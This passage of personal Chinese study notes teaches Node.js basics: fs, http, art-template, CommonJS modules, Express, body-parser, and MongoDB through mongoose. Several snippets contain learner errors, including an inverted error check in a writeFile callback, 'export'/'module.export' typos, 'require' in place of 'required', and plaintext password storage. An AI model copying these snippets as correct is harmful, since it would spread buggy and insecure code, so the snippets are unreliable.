这个配置到文件中 每次 npm就会使用cnpm\n\n\n\n### 0.7 package-lock.json\n\nnpm 5 后，在安装包的时候，npm就会生成或者更新 `package-lock.json`这个文件\n\n+ npm5 后安装包 不需要加 `--save` 都会自动保存依赖信息\n+ 当安装包时 会自动创建或更新这个文件 (在项目的根目录下)\n+ 改文件会保存 `node_modules` 中所有包的信息(版本、下载地址)\n  + 这样的话 重新 `npm install` 时 速度可以提升\n+ lock -> 锁\n  + 锁定版本： 正常来说 项目依赖了 1.1.1,在重新下载时 会下载最新版本,但希望可以锁住版本，改文件就可以锁住版本号，防止自动升级\n\n\n\n### 0.8 find 和 findIndex 的原理\n\nes6 新增的方法\n\n> 接收一个方法作为参数 方法内有一个返回条件 \n>\n> find 会遍历所有元素 执行给的带有条件返回值的函数\n>\n> if 符合改条件的元素会作为find方法的返回值\n>\n> if 无符号 就返回 undefined\n\nfind 和 findIndex 原理：\n\n~~~js\nconst users = [ {id:1,name:'lili'}, {id:2,name:'lii'}, {id:3,name:'li'}]\n\nArray.prototype.myFind = function(conditionFunc){\n    //conditionFunc = function(item index){ return item.id === 2}\n    for(let i = 0; i < this.length; i++ ){\n        if( conditionFunc(this[i],i) ){  //this[i] = item ，i= index\n            return this[i];   //if return i 就是 findIndex\n        }\n    }\n}\n\nconst ret = users.myFind(function(item,index){\n    return item.id === 2;\n})\n\nconsole.log(ret);  //{id:2,name:'lii'}\n\n//使用\narr.find(function(item){\n    return item.id === id\n})\n~~~\n\n\n\n### 0.9 reduce\n\n[1,2,3].reduce( (prev,curr) => { return prev + curr} )  //6相加\n\n## 1. node.js介绍\n\n### 1.1 能做什么\n\n+ web 服务器后台\n+ 命令行工具\n  + npm - node\n  + git - c\n  + hexo - node\n  + ...\n\n> 前端接触最多的就是命令行工具，主要是用第三方的\n>\n> + webpack\n> + gulp\n> + npm\n\n\n\n### 1.2 预备知识\n\nhtml -> css -> js -> 简单命令行操作 -> 服务端开发经验更好\n\n\n\n### 1.3 资源\n\n+ <深入浅出 node.js>\n  \n  + 偏理论，无实战内容\n  + 对理解底层有帮助\n  + 可结合课程看\n  \n+ <node.js 权威指南>\n  + api 讲解\n  + 无实战\n  \n+ JavaScript 标准参考教程(alpha) : http://javascript.ruanyifeng.com/\n\n+ node 入门 : https://www.nodebeginner.org/index-zh-cn.html\n\n+ 官方 api 文档 ：https://nodejs.org/dist/latest-v6.x/docs/api/\n\n+ 中文文档 (版本较旧) ：http://www.nodeclass.com/api/node.html\n\n+ CNODE 社区 ：https://cnodejs.org\n\n+ CNODE - 新手入门 ：http://cnodejs.org/getstart\n\n  > es6 ： <ECMAScript 6 入门> —阮一峰\n  >\n  > ​           <深入理解 ES6>  — \t尼古拉斯\n\n\n\n### 1.4 这门课程能学到的东西\n\n+ b/s 编程模型\n\n  + Browser - Server\n\n  + back - end\n\n    > 任何服务端技术 的 bs 编程模型都是一样的，和语言无关\n    >\n    > node 只是作为学习 bs 编程模型的一个工具\n\n+ 模块化编程\n  + RequireJS\n  + SeaJS\n  + `@import('文件路径')`\n+ node 常用 api\n+ 异步编程\n  + 回调函数\n  + Promise\n  + async\n  + generator\n+ Express Web开发框架\n+ Ecmascript6\n  + 课程中穿插讲解\n+ …\n\n\n\n## 2. 起步\n\n### 2.1 安装 node 环境\n\n+ 查看版本号\n+ 下载： 官网 -> 安装 -> 确认安装是否成功 -> 环境变量\n\n\n\n### 2.2 node 执行 js 文件\n\n1. cmd 打开到 js 文件所在的文件夹\n2. 使用 ` node 文件名.js `运行 js 文件 \n\n> 文件名 不要用 node.js\n>\n> if 用这个  node node.js 就会打开文件  \n>\n> 最好不使用中文\n\n\n\n### 2.3 node 特点(与浏览器相比)\n\n#### 2.3.1 ecmascript\n\n+ 解析执行JavaScript\n\n+ 无 dom bom\n\n  > window document is not defined\n\n  \n\n#### 2.3.2 核心模块\n\n在使用前都需要 const mondel = require('模块名称')\n\n[官网api](http://nodejs.cn/api/) 可以看到核心模块\n\n常用 ： fs os path request http\n\n例子：\n\n+ #### 可以读写文件\n\n  + 读：\n\n    1.使用requirt 加载 fs 核心模块 \n\n    2.使用fs.readFile 读取文件\n\n    ~~~js\n    //第一个参数 读取的文件路径\n    //第二个参数  回调函数      => error  读失败 error错误对象; 读成功 error=null\n    //                          data   读失败 error错误对象; 读成功 data 读取到的数据\n    \n    // 因为数据 是 二进制 转为 16进制 的 ，如果要看懂的话 要用toString\n    const fs = require(\"fs\");\n    fs.readFile('../nodejs.md', function (error, data) {\n      // console.log(data);\n      console.log(data.toString());\n    });\n    ~~~\n\n  + 写：\n\n    1.使用requirt 加载 fs 核心模块 \n\n    2.使用fs.writeFile 读取文件\n\n    > 要自己创建文件夹\n\n    ~~~js\n    // 第一个参数 文件路径\n    // 第二个参数 文件内容\n    // 第三个参数 回调函数  其参数error => 成功 error=null 失败 error=错误对象\n    const fs = require(\"fs\");\n    fs.writeFile('./data/01writefile', '2021.08.16 to learn file', function (error) {\n      if (error) {\n        console.log(\"ok 200\");\n      } else {\n        console.log(error);\n      }\n    })\n    ~~~\n\n+ #### http \n\n  1. 使用node非常轻松的构建一个web服务器\n\n     在node中专门提供了一个核心模块：http - 职责 就是帮你创建编写服务器的\n\n     1.加载核心模块 http\n\n     2.使用http.createServer() 创建一个web服务器 返回一个Server实例\n\n     3.服务器的用处 提供对数据的服务 -> 发请求 -> 接收请求 -> 处理请求 -> 发送响应\n\n       注册request请求事件 当客户端请求过来 会自动触发服务器的request请求事件，执行回调函数\n\n       回调函数有两个对象参数 request，response\n\n     + requset.url 会把http://127.0.0.1:3000 后面的东西返回到终端 只要每次触发request就会\n\n     + response.write() 会把括号内的 字符串 响应到客户端 可以用多次 但是最后要加response.end()\n\n       + 也可以直接在 response.end(“响应数据”) **响应数据只能是二进制数据 或者 字符串**\n\n     + 可以利用 不同的 request.url 响应不同的 write内容到客户端\n\n     + response.setHeader('Content-Type', 'text/plain;charset=utf-8');  **解决乱码**\n\n        在http 协议中 Content-Type 是 数据内容的类型  [oschina 网站 查表](https://tool.oschina.net/commons) \n\n        text/plain：普通文本 ； text/html：html ；image/jpeg：jpg (不用指定编码 只有**字符数据要**)；\n\n     4.绑定端口号，启动服务器\n\n     ~~~js\n     const http = require(\"http\");\n     let server = http.createServer();\n     server.on('request', function (request, response) {\n         \n       // 解决乱码问题 浏览器在不知道什么编码时 会用操作系统的默认编码 gbk\n       response.setHeader('Content-Type', 'text/plain;charset=utf-8');\n         \n       console.log(\"200 ok + url: \" + request.url);\n       if (request.url == '/') {\n         response.write('index');\n       } else {\n         response.write('other');\n       }\n       response.end()\n     })\n     server.listen(3000, function () {\n         //因为启动需要时间 所以整一个回调函数\n       console.log(\"服务器启动成功，可以通过http://127.0.0.1:3000/ 进行访问\");\n     })\n     ~~~\n\n     > 此时在终端运行文件后 会打印listen的内容 表启动了服务器 此时 如果用浏览器打开 访问 就会触发request请求\n     >\n     > 可以用 crtl + c 结束服务器\n     >\n     > <img src='https://s1.328888.xyz/2022/04/09/XK83v.jpg' style=\"zoom:80%; float:left;\" >\n     >\n     > \n     >\n     > 加上request 和 response 后\n     >\n     > <img src='https://s1.328888.xyz/2022/04/09/XKAE0.jpg' style=\"zoom:80%; float:left;\" >\n\n     \n\n  2. 利用 服务器的 response 响应页面\n\n     > 与 fs 核心模块 配合使用 到对应的url 就读相应文件 然后响应到客户端上\n\n     ~~~js\n     const http = require(\"http\");\n     const fs = require(\"fs\");\n     \n     let server = http.createServer();\n     server.on('request', function (request, response) {\n       response.setHeader(\"Content-Type\", \"text/plain;charset=utf-8\");\n       console.log(\"访问路径为: \" + request.url);\n       if (request.url == '/index') {\n         fs.readFile('./view/learn.html', function (err, data) {\n           if (err) {\n             console.log(\"文件读取失败 请稍后重试\");\n           } else {\n             response.setHeader(\"Content-Type\", \"text/html;charset=utf-8\");\n             response.end(data)\n           }\n         })\n       } else {\n         response.end(\"其他\")\n       }\n     \n     })\n     \n     server.listen(3000, function () {\n       console.log(\"服务器启动成功，可以通过http://127.0.0.1:3000/ 进行访问\");\n     })\n     ~~~\n\n     \n\n\n\n#### 2.3.3 第三方模块\n\n#### 2.3.4 用户自定义模块\n\n> node 中只有 模块作用域\n\nrequire \n\n作用 ：用来加载模块执行代码 (1.具名的核心模块 fs.. 2.用户自己编写的文件模块 ./… ./不能省略 后缀名可以省 )\n\n​                 拿到模块中的导出对象 \n\n\n\n\n\n### 2.4 ip地址和端口号\n\n+ 网卡：只有一个 同一个局域网中 网卡的地址唯一 通过唯一的ip地址来进行定位\n+ ip 地址 用来定位计算机 \n+ 端口号 用来定位具体的应用程序\n  + 所有需要联网的应该程序都会占用一个端口号\n  + 端口号的范围 0 - 65536 之间\n  + 不要用到默认端口号 \n\n> 核心模块 http 中  const http = require('http') \n>\n> 创建server let server = http.createServer()\n>\n> 监听request 请求事件 server.on('request',function(request , response){…})\n>\n> + 请求url : request.url\n> + 请求我的客户端端口号 : request.socket.remotePort\n> + 请求我的客户端地址 ip+port : request.socket.remoteAddress \n\n\n\n### 2.5 服务端渲染 和 客户端渲染\n\n1. 服务端渲染\n\n   + **页面刷新** 服务端渲染 网页源码有\n   + 只请求一次\n   + 响应的就是页面最终结果\n\n   + <img src='https://s1.328888.xyz/2022/04/09/XKHRF.jpg' style=\"zoom:60%;\" >\n\n2. 客户端渲染\n\n   + **点击页面不刷新** ajax 异步请求 数据信息在开发者工具才能看到\n   + 两次请求\n   + 第一次 拿到页面\n   + 第二次 拿到动态数据\n   + 再将数据渲染到页面上\n   + <img src='https://s1.328888.xyz/2022/04/09/XKq6W.jpg' style=\"zoom:60%;\" >\n\n\n\n### 2.5 REPL\n\n在终端直接输入node 回车 就可以测试 node 代码\n\n+ read \n+ eval\n+ print\n+ loop\n\n\n\n## 3. 模板引擎\n\n> to 字符串替换\n\n[art-template 官网](https://github.com/aui/art-template) \n\n\n\n### 3.1 安装\n\n~~~shell\nnpm install art-template --save\n~~~\n\n\n\n### 3.2 在 html 浏览器中使用\n\n模板引擎不关心 字符串的内容 只关心自己认识的模板标记语法 例如 mustache 语法 `{{}}`\n\n1. 安装\n2. 导入 lib/template-web.js\n3. 写 text/template id='bbb' 的模板\n4. 写 `template('bbb'{…})` 即模板的`{{}}` 里的数据\n\n~~~html\n<body>\n  <script src=\"node_modules/art-template/lib/template-web.js\"></script>\n  <script type=\"text/template\" id='tpl'>\n    我叫{{name}}\n  </script>\n  <script>\n    const ret = template('tpl', {\n      name: \"lsy\"\n    })\n    console.log(ret); //模板引擎里面的内容\n  </script>\n</body>\n~~~\n\n\n\n### 3.3 在 node 中使用\n\n> 模板最早诞生于服务器领域 后来才发展到了前端\n\n1. 安装\n2. 加载 art-template\n3. 查文档 使用api\n\n~~~js\nconst template = require(\"art-template\");\nconst str = `<p> hello 我是 {{name}} </p>`\nlet ret = template.render(str, {\n  name: 'lsy'\n})\nconsole.log(ret);\n~~~\n\n将模板作为html 导入的写法 并且替换html 响应到页面上\n\n~~~html\n//./02-data.html\n...\n<body>\n  <p>hello 我是{{name}}</p>\n</body>\n...\n~~~\n\n~~~js\nconst template = require(\"art-template\");\nconst fs = require(\"fs\");\nconst http = require(\"http\");\nlet server = http.createServer();\nserver.on('request', function (request, response) {\n  fs.readFile('./02-data.html', function (err, data) {\n    if (err) {\n      return console.log(\"文件读取失败\");\n    }\n\n    let ret = template.render(data.toString(), {\n      name: 'lsy'\n    })\n    // console.log(ret);\n    response.end(ret)\n  })\n})\nserver.listen('3000', function () {\n  console.log('running...');\n})\n~~~\n\n\n\n### 3.4 发表留言的例子\n\n#### 3.4.1 目录结构：\n\n' > node_modules : \n\n' > public : 把所有静态资源都放在这 \n\n​             ' > css\n\n​             ' > img\n\n​             ' > js\n\n​             ' > lib : jquery.js 这种第三方文件\n\n' > views : 所有 html 文件\n\n' > app.js : 后端业务\n\n#### 3.4.2 表单中需要提交的表单控件元素 必须具有 **name** 属性\n\n表单提交分为：1.默认的提交行为 2.表单异步提交\n\naction 表单提交的地址 == 请求的 url\n\nmethod 请求方法\n\n#### 3.4.3 url 核心模块\n\nurl.parse('…url…' ，true) : 将…url… 解析为一个方便接受的对象 ；\n\n​                                        第二个参数==true时，会将查询字符串 query 拆成对象 否则为字符串  \n\n#### 3.4.4 重定向\n\n1. 状态码设置为 302 临时重定向\n\n2. 在响应头通过 Location 通知客户端重定向的地址  \n\n3. res.statusCode = 302;\n\n     res.setHeader('Location', '/');\n\n     res.end();\n\n> 如果客户端 发现服务器的响应的状态码是302 就会去自动找响应头中找 Location 对应的url\n>\n> 所以就可以看到客户端自动跳转\n\n\n\n#### 3.4.5 each\n\n1. art-template 的专属each 模板语法\n\n   ~~~html\n   {{each 数组}}\n   <li>{{ $value }}</li>\n   {{/each}}\n   ~~~\n\n2. es5 的 forEach\n\n   ~~~js\n   //ie 8 不支持\n   ['abc','d','efg'].forEach(function(item,index){\n       \n   })\n   ~~~\n\n3. 遍历 jq 元素\n\n   ~~~js\n   //jq 2.0 以下 可以兼容ie 低版本\n   $.each(['abc','d','efg'],function(index,item){\n       \n   })\n   ~~~\n\n4. 伪数组的遍历 eg：$('div')\n\n   伪数组是对象  对象的原型链Object.prototype 中没有forEach   不能用 如果要用的话 看下面\n\n   ~~~js\n   //这个 each 是 jq 提供的 是在 jq 的原型链中的\n   $('div').each(function(){})\n   //或者可以用forEach\n   [].slice.call($('div')).forEach(function(){})\n   ~~~\n\n   \n\n\n\n## 4. Node 中的模块系统\n\n使用 node 编写应用程序 主要就是在使用：\n\n1. EcmaScript 语言\n2. 核心模块\n3. 第三方模块\n4. 自定义模块\n\n\n\n### 4.1 模块化\n\n+ 文件作用域\n\n+ 通信规则\n  + 加载 require\n  + 导出\n\n### 4.2 CommonJS 模块规范\n\n+ 模块作用域\n\n+ 加载模块 require\n\n  ~~~js\n  require('文件url')\n  ~~~\n\n+ 导出模块成员 exports\n\n  ~~~js\n  //导出多个成员\n  export.a = '...';\n  export.b = '...';\n  ...\n  //导出单个成员 后面会覆盖前面\n  module.exports = '...'\n  ~~~\n\n\n\n原理：\n\n~~~js\n//里面有隐藏的\nlet module = {\n    exports:{\n        ...\n    }\n};\nlet exports = module.exports;\nreturn module.exports; \n\n//导出单个成员 不能export = '...' 这样就会指向另一个对象 导出的数据就不对了\n// 即 给 exports 和 module.exports 赋值都会断开引用\n~~~\n\n\n\n### 4.3 require 加载机制\n\n优先从缓存加载 -> 核心模块 -> 路径形式的文件模块 -> 第三方模块…\n\n> 更加底层的在 《深入浅出node.js》模块化\n\nrequire('模块标识符')  : 核心模块/第三方模块/自定义模块\n\nif 第三方模块\n\n1. 通过 npm 下载\n\n2. 使用时 通过 require(“包名”) 进行加载\n\n3. 不可能有一个第三方包与核心模块的名字相同\n\n4. 既不是核心模块 也不是路径的时候 会 (eg：art-template)\n\n   + 找到当前文件所在目录中的 node_modules 目录\n\n   + 再依次找到 node_modules/art-template/package.json 文件中的 main(: 'index.js') 属性\n\n     > if 没有 package.json 或者没有main ,就会自动找 index.js (默认备选项)\n\n   + main 属性中就记录了 art-template 的入口模块\n\n   + 然后加载使用这个第三方包 实际上最终加载的还是文件\n\n   + if 本级无法查找到 就会往上一级 找node_modules… 直到根目录\n\n   + if 还无 就报错\n\n   + 正常项目就一个node….在根目录\n   \n   \n\n## 5. Express\n\n> 原生 http 在某方面表现不足以应对开发需求 所以需要使用框架 加快开发效率\n>\n> 在node中 有很多web开发框架 以学习Express(封装http)为主\n>\n> 作者 : TJ  node作者:ryan dahl\n\n[官方网站](https://expressjs.com/)\n\n### 5.1 起步\n\n#### 5.1.1 **安装**\n\n`npm install express --save`\n\n#### 5.1.2 **使用**：\n\n1.导包 2.创建服务器应用程序\n\n> + 处理路径问题 和中文乱码 app.get('/', function (req, res) { res.send('hello')  })\n> + 公开指定目录 app.use('/public/', express.static('./public/'))\n> + 直接获取查询字符串参数 req.query\n> + 响应代码 res.send() \n> + res.redirect('/') 和 res.send() 会直接结束请求\n\n~~~js\n// 2. 引包\nconst express = require(\"express\");\n\n// 3. 创建服务器应用程序 == http.createServer\nlet app = express();\n\n// 公开指定目录 public 就可以直接通过 /public/xxx 访问目录中的所有资源\napp.use('/public/', express.static('./public/'))\n\n// 服务器收到get请求时 执行回调函数\n// 直接处理路径问题 和中文乱码\napp.get('/', function (req, res) {\n  res.send('hello')   // 也可以原来的 res.end()\n})\napp.get('/other', function (req, res) {\n  console.log(req.query); // 直接获取 查询字符串参数 \n  res.send('其他')\n})\n\n// ==server.listen\napp.listen(3000, function () {\n  console.log('running...');\n})\n~~~\n\n\n\n#### 5.1.3 基本路由\n\n路由器：请求方法 请求路径 请求处理函数\n\napp.get('/',function(){})\n\napp.post('/',function(){})\n\n\n\n#### 5.1.4 静态服务/路由 \n\n[官网 -> getting started -> static file]()\n\n1. 当以 /public/ 开头时 去 ./public/ 目录找对应的资源 \n\n   app.use('/public/' , express.static('./public/'))  => /public/xxx \n\n2. 当省略第一个参数时 则通过省略 /public 的目录 访问 简化路径操作\n\n   app.use(express.static('./public/')) => /xxx\n\n3. 当第一个参数 为 /a/ 时 ，相当于 在目录中 ./public/ 被 ./a/ 替换(别名)\n\n   app.use('/a/' , express.static('./public/'))  => /a/xxx\n\n\n\n### 5.2 express 配置使用 art-template 模板引擎\n\n>1. 生成 package.js ==> `npm init –yes`\n>2. 安装 express ==> `npm i -S express`\n\n1. 安装在express 使用的art-template\n\n   ==> `npm i -S art-template`  `npm i -S express-art-template`\n\n2. 配置：\n\n   …\n\n   app.engine('html', require('express-art-template'))  ==> 'art' 可以 'html'\n\n   …\n\n   > 第一个参数：当渲染以 .art 文件时 使用art-template模板\n   >\n   > express-art-template 专门用来在 express 中把 art-template 整合到 express 中\n   >\n   > express-art-template 依赖 art-template\n\n3. 使用：\n\n   app.get('/',function(req,res){ res.render('index.art'),{ title:'hello' } })\n\n   > Express 为 Response 对象提供了 render 方法 默认不能用 配置模板引擎才能用\n   >\n   > res.render('html模板名' , {模板数据})  ==> **if 上engine 为 art 那模板名就要.art**\n   >\n   > 第一个参数不写路径(**省略 views 而已**) 默认会去 views 目录找 模板文件 (把所有视图文件都放到 views )\n\n   > if 希望修改 默认 的 views 视图渲染目录 ==> app.set('views',目录路径)\n\n   \n\n### 5.4 express 获取表单 get 请求体数据\n\nexpress 内置了api 直接通过 req.juery 获取\n\n\n\n### 5.5 express 获取表单 post 请求体数据\n\n提交表单 get —> post  /puton —> publish  : 用同一个请求路径 可以多次处理请求 get/post\n\n在express 中没有内置获取表单post请求体的api \n\n==> 使用 第三方包 `body-parse` (express官网 minddleware )中间件/插件 \n\n1. 安装 : `npm i -S body-parse`\n\n2. 配置 : \n\n   ~~~js\n   const express = require('express');\n   const bodyParser = require('body-parser')          //---引包\n   \n   var app = express();\n   \n   // 在req请求多一个body属性  通过req.body 获取表单post请求体数据\n   app.use(bodyParser.json())                         //---配置 body-parser\n   app.use(bodyParser.urlencoded({ extended: true }))\n   \n   app.post('/publish', function (req, res) {\n     comments.unshift(req.body);\n     res.redirect('/')\n   })\n   ~~~\n\n     \n\n### 5.6 crub 案例的知识点\n\n> 注意点 ：表单提交的时候 要有name 才能提交到 查询字符串\n\n+ 把对象存在文件里 然后读取使用 读取的是字符串->对象\n\n  读取文件错误 用状态码500\n\n  ~~~js\n  fs.readfile('./db.json',function(err,data){\n      if(err){\n          return res.status(500).send('server error');\n      }\n      student:JSON.parse(data).students\n  })\n  ~~~\n\n  \n\n+ 路由设计\n\n  请求方法、请求路径、get参数、post参数、备注\n\n+ 将 基本路由与app主要的东西分离开来 把app导出\n\n  运行 app.js 文件\n\n  ~~~js\n  //app.js\n  const express = require(\"express\");\n  const router = require('./router');  //!!!\n  \n  let app = express();\n  \n  app.use('/public/', express.static('./public/'))\n  \n  router(app);    //!!!\n  \n  app.listen(3000, function () {\n    console.log('running....');\n  })\n  \n  module.export = app;\n  \n  //router.js\n  module.exports = function(app){\n      app.get('/',...)\n  }\n  ~~~\n\n+ express 专门包装路由的方式\n\n  > app.js 职责：创建服务 \n  >\n  > ​                    做一些服务相关配置:模板引擎、body-parser解析表单 post 请求体、提供静态资源服务\n  >\n  > ​                     挂载路由\n  >\n  > ​                     监听端口启动服务\n  >\n  > router.js 职责：处理路由 根据不同的请求方法+路径 具体处理函数\n\n  1. 创建路由容器 router\n  2. 把路由都挂载到 router 路由容器中\n  3. 导出 router\n  4. 把路由挂载到app服务器上\n\n  ~~~js\n  //app.js\n  const express = require(\"express\");\n  const router = require('./router');  //!!!\n  \n  let app = express();\n  \n  app.use('/public/', express.static('./public/'))\n  \n  app.use(router);    //挂载!!!\n  \n  app.listen(3000, function () {\n    console.log('running....');\n  })\n  \n  module.export = app;\n  \n  //router.js\n  const express = require(\"express\");\n  const router = express.Router();\n  router.get('/',...);\n  router.get('/',...);\n  module.exports = router\n  ~~~\n\n\n\n## 6. MongoDB\n\n[教程](https://www.runoob.com/mongodb/nosql.html)\n\n### 6.1 关系型数据库 和 非关系型数据库\n\n+ 关系 === 表 (表与表之间存在关系)\n\n  > 需要通过 sql 语言操作\n  >\n  > 操作之前要设计表结构\n  >\n  > 数据包支持约束\n\n+ 非关系\n\n  > 非常灵活\n  >\n  > 有的即使 key-value 键值对\n\n  MongoDB 是长得最像 关系型数据库的 非关系型数据库\n\n  + 数据库 -> 数据库\n  + 数据表 -> 集合/数组\n  + 表记录 -> 文档对象\n  + 不需要设计表结构 可以任意存数据 没有结构性 比较灵活\n\n### 6.2 安装 \n\n[下载](https://www.mongodb.com/try/download/community)\n\n安装\n\n配环境变量 : 命令行检查 `mongod --version`\n\n\n\n### 6.3 启动、关闭、连接、退出连接数据库\n\n+ 启动：`mongod`\n\n​        mongod 默认使用执行 mongod 命令所处盘符根目录下的 /data/db 作为自己的数据存储目录\n\n​        第一次执行时应该提前创建一个 /data/db\n\n+ 修改默认的数据存储目录 : `mongod --dbpath=数据存储目录路径`\n\n+ 关闭 : ctrl + c / 关闭终端\n\n+ 连接 ： mongo (默认连接本机的 MongoDB 服务)\n\n+ 断开 ： exit (退出连接)\n\n\n\n### 6.4 基本命令\n\n+ `show dbs ` : 查看显示所有数据库\n+ ` db ` : 查看当前操作的数据库\n+ ` use 数据库名称 ` : 切换到指定的数据库(if 本无 —> 创建后切换)\n+ `db.集合名称.insertOne({...})` : 插入数据 —> 一个对象\n+ `db.集合名称.find()` : 查看这个集合的所有文档对象\n\n\n\n### 6.5 在node中 操作 mongoDB 数据\n\n+ 通过官方 `mongodb` 包操作 比较原生 一般不用\n\n  [教程](https://github.com/mongodb/node-mongodb-native)\n\n+ 通过第三方包 `mogoose` 操作MongoDB 数据库\n\n  基于官方(上面)做的一个封装 [官网](https://mongoosejs.com/)\n\n  1. 下载包 `npm install mongodb --global`\n\n  2. 下载包 `npm install mongoose --save`\n\n  3. 写一个官网的例子\n\n     ~~~js\n     const mongoose = require('mongoose');\n     // 连接MongoDB数据库\n     mongoose.connect('mongodb://localhost:27017/test', { useNewUrlParser: true, useUnifiedTopology: true });\n     \n     // 创建一个模型 设计数据库 Mongodb 是动态的 只需要在代码中设计数据库\n     // mongoose 这个包可以让你的设计编写过程变得非常简单\n     const Cat = mongoose.model('Cat', { name: String });\n     \n     // 实例化一个cat\n     const kitty = new Cat({ name: 'Zildjian' });\n     \n     // 持久化保存 kitty实例\n     kitty.save().then(() => console.log('meow'));\n     ~~~\n\n  4. 在 终端 运行 `node demo.js`\n\n  5. 可以在数据库查看\n\n     <img src='https://s1.328888.xyz/2022/04/09/XKlCk.jpg' style=\"zoom:77%;\" >\n\n     \n\n#### 6.5.1 mongoose\n\n+ 官网：https://mongoosejs.com/\n+ 官方指南：https://mongoosejs.com/docs/guide.html\n+ 官方api：https://mongoosejs.com/docs/api.html\n\n#### 6.5.2 MongoDB 数据库的基本概念\n\n+ 数据库\n\n+ 集合\n\n+ 文档 -> 文档结构没有限制\n\n+ 很灵活 \n\n  > 在需要插入数据时 只需要指定往哪个数据库的哪个集合操作就可以了\n  >\n  > 其他都有 mongodb 自动完成建库建表\n\n~~~js\n{\n    qq:{                          //数据库\n        users:[                   // 集合 ->数组\n            {name:'li', age:15},  //文档 -> 表记录 对象\n        ]\n    }\n}\n~~~\n\n\n\n### 6.6 官方指南\n\n#### 6.6.1 设计Scheme 发布 Model\n\n~~~js\nconst mongoose = require('mongoose');\n\nconst Schema = mongoose.Schema; //创建设计结构\n\n// 1.连接数据库\n// 指定连接的数据库不需要存在，在插入第一条数据之后就会自动被创建处理\nmongoose.connect('mongodb://localhost/itcast')\n\n// 2.设计集合/文档结构\n// 字段名称就是表结构中的属性名称\n// 约束的目的是为了保证数据的完整性 避免脏数据\n\nconst userSchame = new Schema({\n  username: {\n    type: String,\n    require: true\n  },\n  password: {\n    type: String,\n    require: true\n  },\n  email: {\n    type: String\n  }\n})\n\n// 3.讲文档结构发布为模型\n//   mongoose.model 方法就是用来将一个架构发布为 model\n//   第一个参数：传入一个大写名称单数字符串  User -> 数据库名称\n//               mongoose 会自动将大写名词的字符串 生成 小写复数  users ->  集合名称\n//   第二个参数：架构 Schema\n//   返回值：模型对象/构造函数\nconst User = mongoose.model('User', userSchame)\n\n\n// 4. 当有了模型构造函数后 就可以使用构造函数对 users集合 中数据形象操作\n~~~\n\n\n\n#### 6.6.2 增加数据\n\n~~~js\nconst admin = new User({\n  username: 'admin',\n  password: '123456',\n  email: 'admin@admin.com'\n})\n\nadmin.save(function (err, ret) {\n  if (err) {\n    console.log('err');\n  } else {\n    console.log('success');\n    console.log(ret);\n  }\n})\n\n//console结果\n{\n  _id: 612124d035f7324bb036ea01,\n  username: 'admin',\n  password: '123456',\n  email: 'admin@admin.com',\n  __v: 0\n}\n~~~\n\n\n\n#### 6.6.3 查询数据\n\n查到的数据都会放在 数组里[]\n\n查不到就是 null\n\n1. 查询所有\n\n   ~~~js\n   User.find(function (err, ret) {\n     if (err) {\n       console.log('err');\n     } else {\n       console.log('success');\n       console.log(ret);\n     }\n   })\n   //ret\n   [\n     {\n       _id: 612124d035f7324bb036ea01,\n       username: 'admin',\n       password: '123456',\n       email: 'admin@admin.com',\n       __v: 0\n     }\n   ]\n   \n   ~~~\n\n2. 条件查找\n\n   ~~~js\n   User.find({ username: 'zs' }, function (err, ret) {\n     if (err) {\n       console.log('err');\n     } else {\n       console.log('success');\n       console.log(ret);\n     }\n   })\n   \n   //ret\n   [\n     {\n       _id: 612126bb120a184418be6b6d,\n       username: 'zs',\n       password: '123456',\n       email: 'admin@admin.com',\n       __v: 0\n     }\n   ]\n   ~~~\n\n3. 查询单个 if无条件 查第一个  **&  条件**\n\n   ~~~js\n   User.findOne({ username: 'zs', password:'123456' }, function (err, ret) {\n       // & 条件 \n    if (err) {\n     console.log('err');\n    } else {\n     console.log('success');\n     console.log(ret);\n    }\n   })\n   ~~~\n\n4. **|| 条件**查询  **$or:[]**\n\n   ~~~js\n   User.findOne(\n       { $or: [{username: 'zs'}, {password:'123456'}] },\n       function (err, ret) {\n       // & 条件 \n            if (err) {\n             console.log('err');\n            } else {\n             console.log('success');\n             console.log(ret);\n        }\n   })\n   ~~~\n\n   \n\n#### 6.6.4 删除数据\n\n~~~js\nUser.remove({ username: 'zs' }, function (err, ret) {\n  if (err) {\n    console.log('err');\n  } else {\n    console.log('success');\n    console.log(ret);\n  }\n})\n\n//ret\n{ n: 1, ok: 1, deletedCount: 1 }\n\n\n// 删除 根据条件删除所有\nUser.findOneAndRemove({ conditions }, [options], [callback])\n\n// 删除 根据id删除一个\nUser.findByIdAndRemove({ conditions }, [options], [callback])\n\n~~~\n\n\n\n#### 6.6.5 更新数据\n\n第一个参数：id 之前控制 ret 出现的 id\n       第二个参数：修改的值\n\n~~~js\n// 第一个参数：id 之前控制 ret 出现的 id\n// 第二个参数：修改的值\nUser.findByIdAndUpdate('612124d035f7324bb036ea01', { password: '22222' }, function (err, ret) {\n  if (err) {\n    console.log('err');\n  } else {\n    console.log('success');\n    console.log(ret);\n  }\n})\n~~~\n\n\n\n### 6.7 mongoose 的 api 全部支持 promise\n\n#### 6.7.1 查询数据\n\n~~~js\n// promise 查询所有\nUser.find().then(data => console.log(data))\n\n// 做一个用户注册案例 查找用户是否存在\nUser.findOne({ name: 'lsysxn' }).then(user => {\n  if (user) {\n    // 用户存在\n    console.log('always exist');\n  } else {\n    return new User({\n      username: 'lsysxn',\n      password: '123456',\n      email: 'lsy'\n    }).save()\n  }\n}).then(ret => { })\n~~~\n\n\n\n## 7. 论坛项目\n\n### 7.1 path 模块\n\npath 核心模块 — 操作路径\n\n+ path.basename(path [, ext]) : 获取path中的文件名 无对应后缀名 [, ext] 就返回加上后缀的文件名\n\n  > path.basename('D:/a/b/index.js')  —> index.js        path.basename('D:/a/b/index.js' , '.js')  —> index\n\n+ path.dirname(path) : 返回path中的目录\n\n  > path.dirname('D:/a/b/index.js')  —> D:/a/b\n\n+  path.extname(path) : 返回 path 中的后缀名\n\n  > path.extname('D:/a/b/index.js')  —> .js\n\n+ path.isAbsolute(path) : 判断是否绝对路径\n\n+ path.parse(path) : 将 path 解析成对象\n\n  > path.parse('d:/a/b/index.js') —> { root: 'd:/' , dir: 'd:/a/b' , base: 'index.js' , ext: '.js' , name: 'html'}\n\n+ path.join([…paths]) : 拼接 paths , 两个path之间加 /, 支持任意个参数\n\n  > path.join('c:/a' , 'b') —> `c:\\\\a\\\\b`  2 \\ 转义成一个\\ windowns 表示路径是用\\\n\n\n\n### 7.2 node中的其他成员\n\n在每个模块中，除了 `require` `exports` 等模块相关的api之外 还有两个特殊成员：\n\n+ `__dirname` : **动态**获取当前文件模块所属目录的绝对路径\n+ `__filename` : **动态**获取当前文件的绝对路径(包含 文件名)\n+ `__dirname` 和 `__filename` 不受node 